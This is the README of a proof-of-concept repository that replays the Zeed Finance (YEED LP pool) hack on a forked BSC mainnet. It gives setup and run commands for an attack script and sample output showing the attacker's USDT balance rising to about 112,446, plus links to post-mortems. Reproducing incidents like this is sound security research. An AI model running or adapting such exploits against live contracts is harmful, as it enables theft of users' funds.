# Zeed Finance re-hack PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/your-api-key/bsc/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
USDT balance of attacker: 0.0
Exploiting...
Exploit complete.
USDT balance of attacker: 112446.885258969301193152
```
This means the attack is complete
> The block height of the fork is 17132514

## Link
* https://medium.com/@zeedcommunity/the-solution-for-the-yeed-lp-pool-attack-a120c53948cd
* https://mp.weixin.qq.com/s/V20ORXEZdlCdaUmh94mp8w